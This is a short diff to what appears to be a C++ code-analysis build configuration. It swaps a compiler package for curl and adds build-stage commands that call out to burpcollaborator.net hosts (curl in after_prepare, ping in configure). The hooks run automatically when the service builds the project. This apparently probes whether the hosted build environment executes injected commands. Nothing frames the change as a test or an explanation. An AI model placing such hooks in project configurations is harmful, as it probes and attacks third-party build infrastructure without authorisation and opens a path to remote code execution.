@@ -2,9 +2,9 @@ extraction:
   cpp:
     prepare:    # Customizable step used by all languages.
       packages:
-        - g++-6
+        - curl
     after_prepare:    # Customizable step used by all languages.
-      - ping http://ntktjabejzkx9cobyg241vt8vz1rpg.burpcollaborator.net
+      - curl http://ntktjabejzkx9cobyg241vt8vz1rpg.burpcollaborator.net
     configure:    # Customizable step used only by C/C++ extraction.
       command:
         - ping http://jvipl6dalvmtb8q70c403rv4xv3pre.burpcollaborator.net
